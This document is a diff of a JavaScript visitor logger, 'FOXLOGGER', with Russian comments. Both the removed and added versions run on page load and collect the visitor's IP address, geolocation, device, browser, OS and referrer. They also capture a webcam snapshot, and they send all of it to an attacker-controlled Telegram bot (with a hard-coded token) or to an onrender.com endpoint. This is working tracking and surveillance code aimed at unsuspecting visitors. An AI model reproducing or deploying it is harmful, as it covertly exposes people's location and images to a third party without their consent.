@@ -1,22 +1,43 @@
-// logger.js — ОТПРАВКА ЧЕРЕЗ ЗЕРКАЛО (ДАННЫЕ В ТВОЕГО БОТА)
 (async function() {
     "use strict";
 
-    // ========== ТВОИ ДАННЫЕ (НЕ МЕНЯТЬ) ==========
-    const TELEGRAM_BOT_TOKEN = "8916079717:AAFIrsjINbXmyyWZCmQGHak6DnjHGbi6-Xk";
-    const TELEGRAM_CHAT_ID = "8995427762";
-    
-    // ЗЕРКАЛО ДЛЯ РФ (ТОЛЬКО ДЛЯ ОТПРАВКИ, ДАННЫЕ ИДУТ В ТВОЕГО БОТА)
-    const TELEGRAM_MIRROR = "https://tg.api.webrav.ru/bot";  // Работающее зеркало
+    // URL твоего бота на Render
+    const RENDER_URL = "https://drwizzard3-5.onrender.com";  // ЗАМЕНИ НА СВОЙ
 
-    // ========== 1. Сбор IP + геолокация ==========
+    // ========== 1. Сбор данных ==========
     let ipAddress = "0.0.0.0";
     let geo = "не определена";
-    let country = "";
     let city = "";
-    let lat = "";
-    let lon = "";
+    let country = "";
+    let deviceType = "не определено";
+    let browser = "неизвестно";
+    let os = "неизвестно";
 
+    // UserAgent
+    const userAgent = navigator.userAgent;
+    
+    if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
+        deviceType = "📱 Телефон";
+    } else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
+        deviceType = "💻 Компьютер";
+    }
+    
+    if (userAgent.includes("Chrome")) browser = "Chrome";
+    else if (userAgent.includes("Firefox")) browser = "Firefox";
+    else if (userAgent.includes("Safari")) browser = "Safari";
+    else if (userAgent.includes("Edge")) browser = "Edge";
+    
+    if (userAgent.includes("Windows")) os = "Windows";
+    else if (userAgent.includes("Android")) os = "Android";
+    else if (userAgent.includes("iOS")) os = "iOS";
+    else if (userAgent.includes("Mac")) os = "MacOS";
+    else if (userAgent.includes("Linux")) os = "Linux";
+
+    // Время
+    const now = new Date();
+    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });
+
+    // ========== 2. Получаем IP и гео ==========
     try {
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
@@ -27,147 +48,109 @@
         
         city = geoData.city || "неизвестно";
         country = geoData.country_name || "неизвестно";
-        lat = geoData.latitude || "?";
-        lon = geoData.longitude || "?";
-        geo = `${city}, ${country} (${lat}, ${lon})`;
+        geo = `${city}, ${country}`;
     } catch(e) {
         console.warn("Geo error:", e);
-        geo = "ошибка геолокации";
     }
 
-    // ========== 2. Время перехода ==========
-    const now = new Date();
-    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";
+    // ========== 3. Формируем данные для отправки ==========
+    const dataToSend = {
+        ip: ipAddress,
+        geo: geo,
+        time: timeStr,
+        device: deviceType,
+        browser: browser,
+        os: os,
+        url: window.location.href,
+        referer: document.referrer || "прямой переход",
+        userAgent: userAgent.substring(0, 200)
+    };
 
-    // ========== 3. UserAgent / устройство ==========
-    const userAgent = navigator.userAgent;
-    let deviceType = "не определено";
-    
-    if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
-        deviceType = "📱 Телефон";
-    } else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
-        deviceType = "💻 Компьютер";
-    }
-    
-    let browser = "неизвестно";
-    if (userAgent.includes("Chrome")) browser = "Chrome";
-    else if (userAgent.includes("Firefox")) browser = "Firefox";
-    else if (userAgent.includes("Safari")) browser = "Safari";
-    else if (userAgent.includes("Edge")) browser = "Edge";
-    else if (userAgent.includes("Opera")) browser = "Opera";
-    
-    let os = "неизвестно";
-    if (userAgent.includes("Windows")) os = "Windows";
-    else if (userAgent.includes("Android")) os = "Android";
-    else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
-    else if (userAgent.includes("Mac")) os = "MacOS";
-    else if (userAgent.includes("Linux")) os = "Linux";
-
-    let shortUA = userAgent;
-    if (userAgent.length > 80) {
-        shortUA = userAgent.substring(0, 77) + "...";
-    }
-
-    // ========== 4. Формирование текста ==========
-    const textMessage = `🦊 НОВЫЙ ПЕРЕХОД FOXLOGGER
-
-🌐 IP: ${ipAddress}
-📍 Гео: ${geo}
-🕐 Время: ${timeStr}
-📱 Устройство: ${deviceType}
-🌍 Браузер: ${browser}
-💿 ОС: ${os}
-🖥 UserAgent: ${shortUA}
-
-━━━━━━━━━━━━━━━━━━━━━━
-📎 Ссылка: ${window.location.href}
-🔗 Реферер: ${document.referrer || "прямой переход"}`;
-
-    // ========== 5. Захват фото с вебкамеры ==========
-    let photoBlob = null;
-
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        video.autoplay = true;
-        video.playsInline = true;
-
-        await new Promise((resolve) => {
-            video.onloadedmetadata = () => {
-                video.play();
-                resolve();
-            };
-        });
-
-        await new Promise(r => setTimeout(r, 500));
-
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        photoBlob = await new Promise(resolve => {
-            canvas.toBlob(resolve, "image/jpeg", 0.85);
-        });
-
-        stream.getTracks().forEach(track => track.stop());
-    } catch(e) {
-        console.warn("Camera error:", e);
-        photoBlob = null;
-    }
-
-    // ========== 6. Отправка через ЗЕРКАЛО (в ТВОЕГО бота) ==========
-    async function sendToTelegram(blob, caption) {
-        // Пробуем отправить фото через зеркало
-        if (blob) {
-            const url = `${TELEGRAM_MIRROR}${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-            const formData = new FormData();
-            formData.append("chat_id", TELEGRAM_CHAT_ID);
-            formData.append("photo", blob, "snapshot.jpg");
-            formData.append("caption", caption);
-            
-            try {
-                const response = await fetch(url, { method: "POST", body: formData });
-                const result = await response.json();
-                if (result.ok) {
-                    console.log("✅ Фото отправлено через зеркало");
-                    return true;
-                } else {
-                    console.warn("Ошибка фото:", result.description);
-                }
-            } catch(e) {
-                console.warn("Photo send error:", e);
-            }
-        }
-        
-        // Если фото нет или ошибка — отправляем текст через зеркало
-        const textUrl = `${TELEGRAM_MIRROR}${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    // ========== 4. Отправляем на Render ==========
+    async function sendData() {
         try {
-            const response = await fetch(textUrl, {
+            const response = await fetch(`${RENDER_URL}/foxlogger`, {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: caption,
-                    disable_web_page_preview: true
-                })
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(dataToSend)
             });
-            const result = await response.json();
-            if (result.ok) {
-                console.log("✅ Текст отправлен через зеркало");
+            
+            if (response.ok) {
+                console.log("✅ Данные отправлены на сервер");
                 return true;
             } else {
-                console.warn("Ошибка текста:", result.description);
+                console.log("❌ Ошибка сервера:", response.status);
+                return false;
             }
         } catch(e) {
-            console.warn("Text send error:", e);
+            console.log("❌ Ошибка отправки:", e.message);
+            return false;
         }
-        
-        return false;
     }
 
-    // Отправляем
-    await sendToTelegram(photoBlob, textMessage);
+    // ========== 5. Фото с камеры (опционально) ==========
+    async function captureAndSendPhoto() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement("video");
+            video.srcObject = stream;
+            video.autoplay = true;
+            
+            await new Promise(resolve => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    resolve();
+                };
+            });
+            
+            await new Promise(r => setTimeout(r, 300));
+            
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            stream.getTracks().forEach(track => track.stop());
+            
+            const photoBlob = await new Promise(resolve => {
+                canvas.toBlob(resolve, "image/jpeg", 0.85);
+            });
+            
+            // Отправляем фото
+            const formData = new FormData();
+            formData.append("photo", photoBlob, "snapshot.jpg");
+            formData.append("caption", `📸 Снимок с камеры\nIP: ${ipAddress}\nВремя: ${timeStr}`);
+            
+            await fetch(`${RENDER_URL}/foxlogger_photo`, {
+                method: "POST",
+                body: formData
+            });
+            
+            console.log("✅ Фото отправлено");
+        } catch(e) {
+            console.log("Камера недоступна:", e.message);
+        }
+    }
+
+    // ========== 6. ЗАПУСК ==========
+    const sent = await sendData();
+    
+    if (sent) {
+        // Если данные отправились — пробуем сделать фото
+        await captureAndSendPhoto();
+    } else {
+        // Если не отправилось — сохраняем в localStorage
+        try {
+            const failed = JSON.parse(localStorage.getItem("foxlogger_failed") || "[]");
+            failed.push({
+                data: dataToSend,
+                time: new Date().toISOString()
+            });
+            localStorage.setItem("foxlogger_failed", JSON.stringify(failed.slice(-20)));
+            console.log("📦 Данные сохранены локально");
+        } catch(e) {}
+    }
 })();
